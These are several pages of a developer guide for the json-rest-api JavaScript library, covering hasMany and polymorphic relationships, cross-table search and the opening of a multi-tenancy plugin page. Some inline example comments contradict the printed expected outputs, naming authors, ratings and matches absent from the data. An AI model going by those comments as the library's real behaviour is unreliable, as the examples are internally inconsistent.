      links: { self: '/api/publishers/1' }
    },
    {
      type: 'publishers',
      id: '2',
      attributes: { name: 'German Press GmbH' },
      relationships: {
        authors: {
          data: [ { type: 'authors', id: '3' } ],
          links: {
            self: '/api/publishers/2/relationships/authors',
            related: '/api/publishers/2/authors'
          }
        }
      },
      links: { self: '/api/publishers/2' }
    },
    {
      type: 'publishers',
      id: '3',
      attributes: { name: 'Global Publishing' },
      relationships: {
        authors: {
          data: [],
          links: {
            self: '/api/publishers/3/relationships/authors',
            related: '/api/publishers/3/authors'
          }
        }
      },
      links: { self: '/api/publishers/3' }
    }
  ],
  included: [
    {
      type: 'authors',
      id: '1',
      attributes: { name: 'Victor', surname: 'Hugo' },
      relationships: { publisher: { data: { type: 'publishers', id: '1' } } },
      links: { self: '/api/authors/1' }
    },
    {
      type: 'authors',
      id: '2',
      attributes: { name: 'Émile', surname: 'Zola' },
      relationships: { publisher: { data: { type: 'publishers', id: '1' } } },
      links: { self: '/api/authors/2' }
    },
    {
      type: 'authors',
      id: '3',
      attributes: { name: 'Johann', surname: 'Goethe' },
      relationships: { publisher: { data: { type: 'publishers', id: '2' } } },
      links: { self: '/api/authors/3' }
    }
  ],
  links: { self: '/api/publishers?include=authors' }
}
```

**Important Note on `hasMany` in Non-Simplified Mode:**

In non-simplified (full JSON:API) mode, `hasMany` relationships in the `data` section of the parent resource only contain an empty `data` array or `links` to the related endpoint (e.g., `authors: { links: { related: '/api/publishers/1/authors' } }`). The actual related `author` resources are placed in the top-level `included` array. This is standard JSON:API behavior to avoid duplicating large amounts of data. The `included` array ensures that each included resource appears only once, even if referenced by multiple parent resources.

## Filtering by `hasMany` Relationships

Filtering resources based on conditions applied to their `hasMany` relationships is a common requirement. For example, finding all publishers that have an author whose surname starts with 'Hu'. This is achieved by leveraging the `searchSchema` and defining fields that traverse the relationship to the child resource.

The `RestApiKnexPlugin` handles the necessary SQL `JOIN` operations automatically when you define `actualField` in your `searchSchema` to point to a field on a related `hasMany` table.

### Programmatic Usage:

```javascript

// Filter authors by publisher name (cross-table search defined in authors' searchSchema)
const authorsFromGermanPress = await api.resources.authors.query({
  queryParams: {
    filters: {
      publisherName: 'German' // Using the alias 'publisherName' from authors' searchSchema
    }
  }
});
// HTTP: GET /api/authors?filter[publisherName]=German
// Returns: {
//   data: [{ id: '3', name: 'Johann Wolfgang von Goethe', publisher_id: '2' }]
// }

console.log('Authors from German Press:', inspect(authorsFromGermanPress));
// Note: authorsFromGermanPress contains { data, meta, links }
```

The output will be:

```text
Authors from German Press: [ { id: '3', name: 'Johann', surname: 'Goethe', publisher_id: '2' } ]
```

Once again, the search logic is always define on the `schema` -- that is, it's handled by the server -- and not by the client.

This is the part of the searchSchema that does the trick:

```javascript
    publisherName: { type: 'string', actualField: 'publishers.name', filterOperator: 'like' } // Cross-table search
```

The query will automatically add all of the necessary joins to the query so that `publishers.name` will be searched.

The difference with a normal serach on a field of the main table is in the fact that we provided the full path (`publisher.name`). All of the other search options ( `oneOf`, `filterOperator`, `splitBy`) are available

---

[Previous: 2.3 `belongsTo` Relationships](./GUIDE_2_3_BelongsTo_Relationships.md) | [Back to Guide](./README.md) | [Next: 2.5 hasMany records (polymorphic)](./GUIDE_2_5_HasMany_Polymorphic.md)# 2.5 hasMany records (polymorphic)

Polymorphic relationships are a special type of one-to-many association where a single resource can belong to *one of several different* resource types. For example, a `review` might be associated with an `author` *or* a `publisher*. This differs from a standard `belongsTo` where a resource belongs to only one specific type.

To implement this, the "belonging" resource (e.g., `review`) needs two foreign key fields:
1.  An **`idField`** (e.g., `reviewable_id`) to store the ID of the related resource.
2.  A **`typeField`** (e.g., `reviewable_type`) to store the *type* of the related resource (e.g., 'authors' or 'publishers').

`json-rest-api` supports polymorphic relationships via the **`belongsToPolymorphic`** definition on the *child* resource. To establish the reverse `hasMany` link from the parent, you simply use the **`via`** keyword, pointing to the name of the `belongsToPolymorphic` field on the child.

For this section, we'll use our existing `publishers` and `authors` tables, and introduce a new `reviews` table that can give reviews to both authors and publishers.

```javascript
// Define publishers resource
await api.addResource('publishers', {
  schema: {
    name: { type: 'string', required: true, max: 255, search: true, indexed: true},
  },
  relationships: {
    authors: { hasMany: 'authors', foreignKey: 'publisher_id' },
    reviews: { hasMany: 'reviews', via: 'reviewable' } // Polymorphic relationship
  },
});
await api.resources.publishers.createKnexTable();

// Define authors resource
await api.addResource('authors', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true },
    surname: { type: 'string', required: true, max: 100, search: true },
    publisher_id: { type: 'id', belongsTo: 'publishers', as: 'publisher', nullable: true }
  },
  relationships: {
    reviews: { hasMany: 'reviews', via: 'reviewable' } // Polymorphic relationship
  },
});
await api.resources.authors.createKnexTable();

// Define reviews resource with a polymorphic relationship
await api.addResource('reviews', {
  schema: {
    rating: { type: 'number', required: true, min: 1, max: 5 },
    comment: { type: 'string', max: 500, nullable: true },
    // These two fields store the polymorphic relationship data in the database
    reviewable_type: { type: 'string', max: 50, required: true }, 
    reviewable_id: { type: 'id', required: true }, 
  },
  relationships: {
    reviewable: {
      belongsToPolymorphic: {
        types: ['publishers', 'authors'], // The possible resource types this review can belong to
        typeField: 'reviewable_type', // The field in 'reviews' schema storing the parent's type
        idField: 'reviewable_id'      // The field in 'reviews' schema storing the parent's ID
      }
    }
  },
});
await api.resources.reviews.createKnexTable();
```

Defining a polymorphic relationship is more verbose because there are two fields to take care of insteaf of one. So, the parent record can't just say "all records in the child relationship where the field `foreign_id` matches my id" -- it would need to specify two fields, not one: the foreign ID and the table the ID refers to.

This is why the child table defines a `reviewable` object in `relationships` where it states which fields are used for the relationship:

```javascript
  // Child table, e.g. 'reviews' (applicable to publishers and authors)
  relationships: {
    reviewable: {
      belongsToPolymorphic: {
        types: ['publishers', 'authors'],
        typeField: 'reviewable_type',
        idField: 'reviewable_id'
      }
    }
  },
```
So when the parent defines the relationship, they just have to mention `reviewable`:

```javascript
  relationships: {
    reviews: { hasMany: 'reviews', via: 'reviewable' } // Polymorphic relationship
  },
```

`json-rest-api` provides flexibility in how you provide data for polymorphic relationships when creating new records, depending on whether you're using the simplified API mode (default for programmatic calls) or the strict JSON:API format.

Here is how to add reviews, both in simplified and non-simplified mode:

```javascript
const frenchPublisher_ns = await api.resources.publishers.post({ name: 'French Books Inc. (NS)' });
const germanPublisher_ns = await api.resources.publishers.post({ name: 'German Press GmbH (NS)' });

const frenchAuthor1_ns = await api.resources.authors.post({ name: 'Victor (NS)', surname: 'Hugo (NS)', publisher: frenchPublisher_ns.id });
const germanAuthor_ns = await api.resources.authors.post({ name: 'Johann (NS)', surname: 'Goethe (NS)', publisher: germanPublisher_ns.id });

const review1_simplified = await api.resources.reviews.post({
  rating: 4,
  comment: 'Great German author! (Simplified)',
  reviewable_type: 'authors',
  reviewable_id: germanAuthor_ns.id
});

const review2_simplified = await api.resources.reviews.post({
  rating: 1,
  comment: 'I do not enjoy their books',
  reviewable_type: 'publishers',
  reviewable_id: frenchPublisher_ns.id 
});


// Add reviews using non-simplified (JSON:API standard) input with relationships object
const review3_non_simplified = await api.resources.reviews.post({
  inputRecord: {
    data: {
      type: 'reviews',
      attributes: {
        rating: 3,
        comment: 'Decent publisher, some good titles (NS).'
      },
      relationships: { // Explicitly define the polymorphic relationship here
        reviewable: {
          data: { type: 'publishers', id: frenchPublisher_ns.id } // Resource identifier object
        }
      }
    }
  },
  simplified: false // Ensure non-simplified mode for this call
});

const review4_non_simplified = await api.resources.reviews.post({
  inputRecord: {
    data: {
      type: 'reviews',
      attributes: {
        rating: 5,
        comment: 'Hugo is a master storyteller! (NS)'
      },
      relationships: {
        reviewable: {
          data: { type: 'authors', id: frenchAuthor1_ns.id }
        }
      }
    }
  },
  simplified: false
});

const frenchAuthor1_with_reviews_simplified = await api.resources.authors.get({ id: frenchAuthor1_ns.id });
const frenchAuthor1_with_reviews_non_simplified = await api.resources.authors.get({ id: frenchAuthor1_ns.id, simplified: false });

const french_authors_simplified = await api.resources.authors.query({});
// HTTP: GET /api/authors
// Returns (simplified): [
//   { id: '1', name: 'Victor Hugo', publisher_id: '1' },
//   { id: '2', name: 'Alexandre Dumas', publisher_id: '1' }
// ]

const french_authors_non_simplified = await api.resources.authors.query({simplified: false });
// HTTP: GET /api/authors
// Returns (JSON:API): {
//   data: [
//     { type: 'authors', id: '1', attributes: { name: 'Victor Hugo' } },
//     { type: 'authors', id: '2', attributes: { name: 'Alexandre Dumas' } }
//   ]
// }

console.log('Added Publisher Review (simplified):', inspect(review1_simplified));
console.log('Added Author Review (simplified):', inspect(review2_simplified));
console.log('Added Publisher Review (non-Simplified):', inspect(review3_non_simplified));
console.log('Added Author Review (non-Simplified):', inspect(review4_non_simplified));

// Single records
console.log('French author with the newly added reviews (simplified):')
console.log(inspect(frenchAuthor1_with_reviews_simplified));
console.log('French author with the newly added reviews (non-simplified):')
console.log(inspect(frenchAuthor1_with_reviews_non_simplified))

// Lists
console.log('French authors with the newly added reviews (simplified):')
console.log(inspect(french_authors_simplified));
console.log('French authors with the newly added reviews (non-simplified):')
console.log(inspect(french_authors_non_simplified))


```

As you can see, you can add reviews both in simplified and non-simplified mode. Here is the difference:

* **Simplified Mode:** `json-rest-api` automatically recognizes `reviewable_type` and `reviewable_id` attributes as foreign keys for polymorphic relationships defined with `belongsToPolymorphic`. This provides a flattened, convenient syntax for programmatic use.
* **Non-Simplified Mode (JSON:API Standard):** This adheres to the JSON:API specification, where relationships are explicitly defined in the `relationships` object with a resource identifier object (`{ type: 'resourceType', id: 'resourceId' }`). This is typically used when interacting with the API via HTTP or when strict JSON:API compliance is required.

**Expected Output**

```text
Added Publisher Review (simplified): { id: '1', rating: 4, comment: 'Great German author! (Simplified)' }
Added Author Review (simplified): { id: '2', rating: 1, comment: 'I do not enjoy their books' }
Added Publisher Review (non-Simplified): {
  data: {
    type: 'reviews',
    id: '3',
    attributes: { rating: 3, comment: 'Decent publisher, some good titles (NS).' },
    links: { self: '/api/reviews/3' }
  },
  links: { self: '/api/reviews/3' }
}
Added Author Review (non-Simplified): {
  data: {
    type: 'reviews',
    id: '4',
    attributes: { rating: 5, comment: 'Hugo is a master storyteller! (NS)' },
    links: { self: '/api/reviews/4' }
  },
  links: { self: '/api/reviews/4' }
}
French author with the newly added reviews (simplified):
{
  id: '1',
  name: 'Victor (NS)',
  surname: 'Hugo (NS)',
  reviews_ids: [ '4' ],
  publisher_id: '1'
}
French author with the newly added reviews (non-simplified):
{
  data: {
    type: 'authors',
    id: '1',
    attributes: { name: 'Victor (NS)', surname: 'Hugo (NS)' },
    relationships: {
      reviews: { data: [ { type: 'reviews', id: '4' } ] },
      publisher: {
        data: { type: 'publishers', id: '1' },
        links: {
          self: '/api/authors/1/relationships/publisher',
          related: '/api/authors/1/publisher'
        }
      }
    },
    links: { self: '/api/authors/1' }
  },
  links: { self: '/api/authors/1' }
}
French authors with the newly added reviews (simplified):
[
  {
    id: '1',
    name: 'Victor (NS)',
    surname: 'Hugo (NS)',
    reviews_ids: [ '4' ],
    publisher_id: '1'
  },
  {
    id: '2',
    name: 'Johann (NS)',
    surname: 'Goethe (NS)',
    reviews_ids: [ '1' ],
    publisher_id: '2'
  }
]
French authors with the newly added reviews (non-simplified):
{
  data: [
    {
      type: 'authors',
      id: '1',
      attributes: { name: 'Victor (NS)', surname: 'Hugo (NS)' },
      relationships: {
        reviews: { data: [ { type: 'reviews', id: '4' } ] },
        publisher: {
          data: { type: 'publishers', id: '1' },
          links: {
            self: '/api/authors/1/relationships/publisher',
            related: '/api/authors/1/publisher'
          }
        }
      },
      links: { self: '/api/authors/1' }
    },
    {
      type: 'authors',
      id: '2',
      attributes: { name: 'Johann (NS)', surname: 'Goethe (NS)' },
      relationships: {
        reviews: { data: [ { type: 'reviews', id: '1' } ] },
        publisher: {
          data: { type: 'publishers', id: '2' },
          links: {
            self: '/api/authors/2/relationships/publisher',
            related: '/api/authors/2/publisher'
          }
        }
      },
      links: { self: '/api/authors/2' }
    }
  ],
  links: { self: '/api/authors' }
}
```

When you fetch the french author after adding the reviews, you only get the review _ids_ and not the full review data. This is expected. To fetch the actual reviews, you will need to `include` them.

## Including Polymorphic Records (`include`)

To retrieve related polymorphic resources (e.g., getting a publisher and including all its reviews, or getting an author and including all their reviews), you'll use the **`include` query parameter** from the "one" side of the polymorphic relationship.

The output format (simplified vs. non-simplified) will depend on the `simplified` parameter of your `get` or `query` call, or the default `simplifiedApi` setting.

Leaving the exact same schema definition and the exact same data as above, by making these calls:

```javascript
const frenchAuthor1_with_reviews_and_includes_simplified = await api.resources.authors.get({ id: frenchAuthor1_ns.id, queryParams: { include: ['reviews'] } });
const frenchAuthor1_with_reviews_and_includes_non_simplified = await api.resources.authors.get({ id: frenchAuthor1_ns.id, queryParams: { include: ['reviews'] }, simplified: false });

const french_authors_with_includes_simplified = await api.resources.authors.query({queryParams: { include: ['reviews'] } });
// HTTP: GET /api/authors?include=reviews
// Returns (simplified): [
//   { id: '1', name: 'Victor Hugo', publisher_id: '1', 
//     reviews: [{ id: '2', comment: 'A master storyteller', rating: 5, reviewable_type: 'authors', reviewable_id: '1' }]
//   },
//   { id: '2', name: 'Alexandre Dumas', publisher_id: '1', reviews: [] }
// ]

const french_authors_with_includes_non_simplified = await api.resources.authors.query({queryParams: { include: ['reviews'] }, simplified: false });
// HTTP: GET /api/authors?include=reviews
// Returns (JSON:API): {
//   data: [
//     { type: 'authors', id: '1', attributes: { name: 'Victor Hugo' },
//       relationships: { reviews: { data: [{ type: 'reviews', id: '2' }] } }
//     },
//     { type: 'authors', id: '2', attributes: { name: 'Alexandre Dumas' },
//       relationships: { reviews: { data: [] } }
//     }
//   ],
//   included: [
//     { type: 'reviews', id: '2', 
//       attributes: { comment: 'A master storyteller', rating: 5, reviewable_type: 'authors', reviewable_id: '1' }
//     }
//   ]
// }

console.log('French author with the newly added reviews (simplified):')
console.log(inspect(frenchAuthor1_with_reviews_and_includes_simplified));
console.log('French author with the newly added reviews (non-simplified):')
console.log(inspect(frenchAuthor1_with_reviews_and_includes_non_simplified))

console.log('French authors with the newly added reviews (simplified):')
console.log(inspect(french_authors_with_includes_simplified));
console.log('French authors with the newly added reviews (non-simplified):')
console.log(inspect(french_authors_with_includes_non_simplified))
```

**Expected Output**

```text
French author with the newly added reviews (simplified):
{
  id: '1',
  name: 'Victor (NS)',
  surname: 'Hugo (NS)',
  reviews_ids: [ '4' ],
  reviews: [
    {
      id: '4',
      rating: 5,
      comment: 'Hugo is a master storyteller! (NS)',
      reviewable_type: 'authors',
      reviewable_id: '1'
    }
  ],
  publisher_id: '1'
}
French author with the newly added reviews (non-simplified):
{
  data: {
    type: 'authors',
    id: '1',
    attributes: { name: 'Victor (NS)', surname: 'Hugo (NS)' },
    relationships: {
      reviews: {
        data: [ { type: 'reviews', id: '4' } ],
        links: {
          self: '/api/authors/1/relationships/reviews',
          related: '/api/authors/1/reviews'
        }
      },
      publisher: {
        data: { type: 'publishers', id: '1' },
        links: {
          self: '/api/authors/1/relationships/publisher',
          related: '/api/authors/1/publisher'
        }
      }
    },
    links: { self: '/api/authors/1' }
  },
  included: [
    {
      type: 'reviews',
      id: '4',
      attributes: { rating: 5, comment: 'Hugo is a master storyteller! (NS)' },
      relationships: { reviewable: { data: { type: 'authors', id: '1' } } },
      links: { self: '/api/reviews/4' }
    }
  ],
  links: { self: '/api/authors/1' }
}
French authors with the newly added reviews (simplified):
[
  {
    id: '1',
    name: 'Victor (NS)',
    surname: 'Hugo (NS)',
    reviews_ids: [ '4' ],
    reviews: [
      {
        id: '4',
        rating: 5,
        comment: 'Hugo is a master storyteller! (NS)',
        reviewable_type: 'authors',
        reviewable_id: '1'
      }
    ],
    publisher_id: '1'
  },
  {
    id: '2',
    name: 'Johann (NS)',
    surname: 'Goethe (NS)',
    reviews_ids: [ '1' ],
    reviews: [
      {
        id: '1',
        rating: 4,
        comment: 'Great German author! (Simplified)',
        reviewable_type: 'authors',
        reviewable_id: '2'
      }
    ],
    publisher_id: '2'
  }
]
French authors with the newly added reviews (non-simplified):
{
  data: [
    {
      type: 'authors',
      id: '1',
      attributes: { name: 'Victor (NS)', surname: 'Hugo (NS)' },
      relationships: {
        reviews: {
          data: [ { type: 'reviews', id: '4' } ],
          links: {
            self: '/api/authors/1/relationships/reviews',
            related: '/api/authors/1/reviews'
          }
        },
        publisher: {
          data: { type: 'publishers', id: '1' },
          links: {
            self: '/api/authors/1/relationships/publisher',
            related: '/api/authors/1/publisher'
          }
        }
      },
      links: { self: '/api/authors/1' }
    },
    {
      type: 'authors',
      id: '2',
      attributes: { name: 'Johann (NS)', surname: 'Goethe (NS)' },
      relationships: {
        reviews: {
          data: [ { type: 'reviews', id: '1' } ],
          links: {
            self: '/api/authors/2/relationships/reviews',
            related: '/api/authors/2/reviews'
          }
        },
        publisher: {
          data: { type: 'publishers', id: '2' },
          links: {
            self: '/api/authors/2/relationships/publisher',
            related: '/api/authors/2/publisher'
          }
        }
      },
      links: { self: '/api/authors/2' }
    }
  ],
  included: [
    {
      type: 'reviews',
      id: '4',
      attributes: { rating: 5, comment: 'Hugo is a master storyteller! (NS)' },
      relationships: { reviewable: { data: { type: 'authors', id: '1' } } },
      links: { self: '/api/reviews/4' }
    },
    {
      type: 'reviews',
      id: '1',
      attributes: { rating: 4, comment: 'Great German author! (Simplified)' },
      relationships: { reviewable: { data: { type: 'authors', id: '2' } } },
      links: { self: '/api/reviews/1' }
    }
  ],
  links: { self: '/api/authors?include=reviews' }
}
```

When fetching data programmatically in **simplified mode** (which is the default), polymorphic `hasMany` relationships will appear as **arrays of child objects** embedded directly within the parent resource, just like regular `hasMany` relationships.

When you explicitly request **non-simplified output**, the polymorphic `hasMany` relationships will appear in the **`included` array** at the top level of the JSON:API document. The parent resource's `relationships` object will contain links to the related endpoint but not the full related data itself.

## Filtering by Polymorphic Relationships

Filtering by polymorphic relatiohships has two sides:

* **Filtering the polymorphic resource itself (e.g., `reviews`):**

This happens when you want to search reviews, and you want to also search in the reviewed item's information. For example searching for 'Apress' would return all reviews where the publisher name includes `Apress`. this is a very common scenario.  This is achieved via cross-table filtering.

* **Filtering the parent resource (e.g., `publishers` or `authors`) by its polymorphic `hasMany` children (`reviews`)**

This happens when you want to search in `publishers`, and you want to also search in the publisher's reviews. For exaple searching for "terrible" would return all publishers containing a review with the word `awesome`. This is also a very common scenario.

### Search (polymorphic)

Keeping the data already entered, change the resource definitions to match this:

```javascript
// Define publishers resource
// Publishers can have many authors (regular relationship) and many reviews (polymorphic)
await api.addResource('publishers', {
  schema: {
    name: { type: 'string', required: true, max: 255, search: true, indexed: true},
  },
  relationships: {
    authors: { hasMany: 'authors', foreignKey: 'publisher_id' }, // Regular one-to-many
    reviews: { hasMany: 'reviews', via: 'reviewable' } // Polymorphic one-to-many
  },
  searchSchema: {
    // Search publishers by their review fields (reverse polymorphic search)
    reviewComment: { 
      type: 'string', 
      actualField: 'reviews.comment', 
      filterOperator: 'like' 
    },
    reviewRating: { 
      type: 'number', 
      actualField: 'reviews.rating', 
      filterOperator: '=' 
    }
  }
});
await api.resources.publishers.createKnexTable();

// Define authors resource  
// Authors belong to a publisher (regular relationship) and can have many reviews (polymorphic)
await api.addResource('authors', {
  schema: {
    name: { type: 'string', required: true, max: 100, search: true },
    surname: { type: 'string', required: true, max: 100, search: true },
    publisher_id: { type: 'id', belongsTo: 'publishers', as: 'publisher', nullable: true }
  },
  relationships: {
    reviews: { hasMany: 'reviews', via: 'reviewable' } // Polymorphic one-to-many
  },
  searchSchema: {
    // Regular search fields
    name: { type: 'string', filterOperator: 'like' },
    surname: { type: 'string', filterOperator: 'like' },
    
    // Cross-table search into regular relationship
    publisherName: { 
      type: 'string', 
      actualField: 'publishers.name', 
      filterOperator: 'like' 
    },
    
    // Cross-table search into polymorphic relationship (reverse polymorphic search)
    // This will find authors by searching their reviews' comments
    reviewComment: { 
      type: 'string', 
      actualField: 'reviews.comment', 
      filterOperator: 'like' 
    }
  }
});
await api.resources.authors.createKnexTable();


// Define reviews resource with a polymorphic relationship
// A review can belong to either a publisher OR an author (but not both)
// This is achieved using a type field and an ID field
await api.addResource('reviews', {
  schema: {
    rating: { type: 'number', required: true, min: 1, max: 5, indexed: true },
    comment: { type: 'string', max: 500, nullable: true, indexed: true },
    
    // Polymorphic relationship fields:
    reviewable_type: { type: 'string', max: 50, required: true }, // Stores 'publishers' or 'authors'
    reviewable_id: { type: 'id', required: true }, // Stores the ID of the publisher or author
  },
  relationships: {
    // Polymorphic belongsTo relationship
    reviewable: {
      belongsToPolymorphic: {
        types: ['publishers', 'authors'], // The possible resource types this review can belong to
        typeField: 'reviewable_type', // The field in 'reviews' schema storing the parent's type
        idField: 'reviewable_id'      // The field in 'reviews' schema storing the parent's ID
      },
    }
  },
  searchSchema: {
    rating: { type: 'number', filterOperator: '=' },
    comment: { type: 'string', filterOperator: 'like' },
    
    // Polymorphic search field (forward polymorphic search)
    // This searches for reviews by their parent's name field, regardless of parent type
    reviewableName: {
      type: 'string',
      polymorphicField: 'reviewable',  // Reference the polymorphic relationship
      targetFields: {
        publishers: 'name',    // When reviewable_type='publishers', search publishers.name
        authors: 'name'        // When reviewable_type='authors', search authors.name
      },
      filterOperator: 'like'
    }
  }
});
await api.resources.reviews.createKnexTable();
```

The schema definitions above demonstrate two powerful polymorphic search patterns:

**1. Forward Polymorphic Search** (in reviews.searchSchema)

The `reviewableName` search field allows searching reviews by their parent's name, regardless of whether the parent is a publisher or author:

```javascript
reviewableName: {
  type: 'string',
  polymorphicField: 'reviewable',  // Points to the polymorphic relationship
  targetFields: {
    publishers: 'name',    // When parent is a publisher, search its 'name' field
    authors: 'name'        // When parent is an author, search its 'name' field
  },
  filterOperator: 'like'
}
```

This generates SQL that dynamically JOINs to different tables based on the `reviewable_type`:
- When `reviewable_type = 'publishers'`, it JOINs to the publishers table
- When `reviewable_type = 'authors'`, it JOINs to the authors table

**2. Reverse Polymorphic Search** (in authors.searchSchema and publishers.searchSchema)

The `reviewComment` search field allows finding parents (authors/publishers) by searching their polymorphic children (reviews):

```javascript
// In authors.searchSchema:
reviewComment: { 
  type: 'string', 
  actualField: 'reviews.comment',  // Search in the reviews table
  filterOperator: 'like' 
}

// In relationships:
reviews: { hasMany: 'reviews', via: 'reviewable' }  // Polymorphic relationship
```

This uses the `via` property to indicate a polymorphic hasMany relationship. The system automatically adds the polymorphic constraints:
- For authors: `reviews.reviewable_type = 'authors' AND reviews.reviewable_id = authors.id`
- For publishers: `reviews.reviewable_type = 'publishers' AND reviews.reviewable_id = publishers.id`

This enables powerful queries like "find all authors who have reviews mentioning 'storyteller'" without manually writing complex JOINs.

With the same data, run these queries:

```javascript
// 1. Forward polymorphic search: Find reviews by their parent's name
// This searches across BOTH publishers and authors tables based on reviewable_type
const reviews_filtered_simplified = await api.resources.reviews.query({ queryParams: { filters: {reviewableName: 'Victor'} }})
// HTTP: GET /api/reviews?filter[reviewableName]=Victor
// Returns: [{ id: '2', comment: 'A master storyteller', rating: 5, reviewable_type: 'authors', reviewable_id: '1' }]

const reviews_filtered_non_simplified = await api.resources.reviews.query({queryParams: { filters: {reviewableName: 'Victor'} }, simplified: false })
// HTTP: GET /api/reviews?filter[reviewableName]=Victor
// Returns (JSON:API): {
//   data: [{ type: 'reviews', id: '2', attributes: { comment: 'A master storyteller', rating: 5, reviewable_type: 'authors', reviewable_id: '1' } }]
// }

// 2. Reverse polymorphic search: Find parents (authors) by their children's (reviews) fields
// This uses a polymorphic JOIN: reviews.reviewable_type = 'authors' AND reviews.reviewable_id = authors.id
const authors_filtered_simplified = await api.resources.authors.query({queryParams: { filters: {reviewComment: 'storyteller'} }})
// HTTP: GET /api/authors?filter[reviewComment]=storyteller
// Returns: [{ id: '1', name: 'Victor Hugo', publisher_id: '1' }]

const authors_filtered_non_simplified = await api.resources.authors.query({queryParams: { filters: {reviewComment: 'storyteller'} }, simplified: false })
// HTTP: GET /api/authors?filter[reviewComment]=storyteller
// Returns (JSON:API): {
//   data: [{ type: 'authors', id: '1', attributes: { name: 'Victor Hugo' } }]
// }

// 3. Reverse polymorphic search: Find parents (publishers) by their children's (reviews) fields
// This uses a polymorphic JOIN: reviews.reviewable_type = 'publishers' AND reviews.reviewable_id = publishers.id
const publishers_filtered_simplified = await api.resources.publishers.query({queryParams: { filters: {reviewComment: 'enjoy'} }})
// HTTP: GET /api/publishers?filter[reviewComment]=enjoy
// Returns: [{ id: '1', name: 'French Books Inc.', country_id: '1' }]

const publishers_filtered_non_simplified = await api.resources.publishers.query({queryParams: { filters: {reviewComment: 'enjoy'} }, simplified: false })
// HTTP: GET /api/publishers?filter[reviewComment]=enjoy
// Returns (JSON:API): {
//   data: [{ type: 'publishers', id: '1', attributes: { name: 'French Books Inc.' } }]
// }


console.log('Reviews FILTERED (simplified):')
console.log(inspect(reviews_filtered_simplified));
console.log('Reviews FILTERED (non-simplified):')
console.log(inspect(reviews_filtered_non_simplified))

console.log('Authors FILTERED (simplified):')
console.log(inspect(authors_filtered_simplified));
console.log('Authors FILTERED (non-simplified):')
console.log(inspect(authors_filtered_non_simplified))

console.log('Publishers FILTERED (simplified):')
console.log(inspect(publishers_filtered_simplified));
console.log('Publishers FILTERED (non-simplified):')
console.log(inspect(publishers_filtered_non_simplified))

```

**Expected results**
```
Reviews FILTERED (simplified):
{
  data: [
    {
      id: '4',
      rating: 5,
      comment: 'Hugo is a master storyteller! (NS)',
      reviewable_type: 'authors',
      reviewable_id: '1'
    }
  ],
  meta: {...},
  links: {...}
}
Reviews FILTERED (non-simplified):
{
  data: [
    {
      type: 'reviews',
      id: '4',
      attributes: { rating: 5, comment: 'Hugo is a master storyteller! (NS)' },
      relationships: {
        reviewable: {
          data: { type: 'authors', id: '1' },
          links: {
            self: '/api/reviews/4/relationships/reviewable',
            related: '/api/reviews/4/reviewable'
          }
        }
      },
      links: { self: '/api/reviews/4' }
    }
  ],
  links: { self: '/api/reviews?filters[reviewableName]=Victor' }
}
Authors FILTERED (simplified):
{
  data: [
    {
      id: '1',
      name: 'Victor (NS)',
      surname: 'Hugo (NS)',
      reviews_ids: [ '4' ],
      publisher_id: '1'
    }
  ],
  meta: {...},
  links: {...}
}
Authors FILTERED (non-simplified):
{
  data: [
    {
      type: 'authors',
      id: '1',
      attributes: { name: 'Victor (NS)', surname: 'Hugo (NS)' },
      relationships: {
        reviews: { data: [ { type: 'reviews', id: '4' } ] },
        publisher: {
          data: { type: 'publishers', id: '1' },
          links: {
            self: '/api/authors/1/relationships/publisher',
            related: '/api/authors/1/publisher'
          }
        }
      },
      links: { self: '/api/authors/1' }
    }
  ],
  links: { self: '/api/authors?filters[reviewComment]=storyteller' }
}
Publishers FILTERED (simplified):
{
  data: [
    {
      id: '1',
      name: 'French Books Inc. (NS)',
      authors_ids: [ '1' ],
      reviews_ids: [ '2', '3' ]
    }
  ],
  meta: {...},
  links: {...}
}
Publishers FILTERED (non-simplified):
{
  data: [
    {
      type: 'publishers',
      id: '1',
      attributes: { name: 'French Books Inc. (NS)' },
      relationships: {
        authors: { data: [ { type: 'authors', id: '1' } ] },
        reviews: {
          data: [
            { type: 'reviews', id: '2' },
            { type: 'reviews', id: '3' }
          ]
        }
      },
      links: { self: '/api/publishers/1' }
    }
  ],
  links: { self: '/api/publishers?filters[reviewComment]=enjoy' }
}
```

The output demonstrates how polymorphic search works across both simplified and JSON:API formats:

**Forward Polymorphic Search Results (reviews filtered by parent name "Victor")**

The query `filters: {reviewableName: 'Victor'}` found review ID 4, which belongs to author "Victor Hugo". The search worked by:
1. Checking each review's `reviewable_type` field
2. When it found `reviewable_type = 'authors'`, it JOINed to the authors table using `reviewable_id = authors.id`
3. It then searched for `authors.name LIKE '%Victor%'`

In the simplified format, notice how the polymorphic fields are included:
```javascript
{
  id: '4',
  rating: 4,
  comment: "Great storyteller (NS)",
  reviewable_type: 'authors',    // These polymorphic fields are restored
  reviewable_id: '1'              // in simplified mode after our fix!
}
```

**Reverse Polymorphic Search Results**

1. **Authors filtered by review comment "storyteller"**: Found author ID 1 (Victor Hugo) because he has review ID 4 containing "storyteller"
2. **Publishers filtered by review comment "enjoy"**: Found publisher ID 1 because it has reviews IDs 2 and 3 containing "enjoy"

The reverse search worked by:
- JOINing from authors/publishers to reviews with polymorphic constraints
- For authors: `JOIN reviews ON reviews.reviewable_type = 'authors' AND reviews.reviewable_id = authors.id`
- Then filtering: `WHERE reviews.comment LIKE '%storyteller%'`

In simplified format, the relationships are represented as arrays of IDs:
- `reviews_ids: [ '4' ]` - Author 1 has one review
- `reviews_ids: [ '2', '3' ]` - Publisher 1 has two reviews

The polymorphic search seamlessly handles the fact that reviews can belong to different parent types, making it easy to search across these complex relationships without writing custom SQL.

---

[Previous: 2.4 hasMany records](./GUIDE_2_4_HasMany_Records.md) | [Back to Guide](./README.md) | [Next: 2.6 Many to many (hasMany with through records)](./GUIDE_2_6_Many_To_Many.md)# Multi-Tenancy with the MultiHome Plugin

The MultiHome plugin provides automatic data isolation for multi-tenant applications. It ensures that users can only access data belonging to their tenant, making it impossible to accidentally or maliciously access data from other tenants.

## Table of Contents

- [Overview](#overview)
- [How It Works](#how-it-works)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage Examples](#usage-examples)
- [Security Features](#security-features)
- [Integration with Other Plugins](#integration-with-other-plugins)
- [API Reference](#api-reference)
- [Troubleshooting](#troubleshooting)
- [Best Practices](#best-practices)

## Overview

Multi-tenancy is a critical requirement for SaaS applications where multiple customers (tenants) share the same application instance but must have completely isolated data. The MultiHome plugin makes this easy by:

- **Automatic Query Filtering**: Every database query automatically includes a WHERE clause for the tenant ID
- **Automatic Record Assignment**: New records are automatically assigned to the current tenant
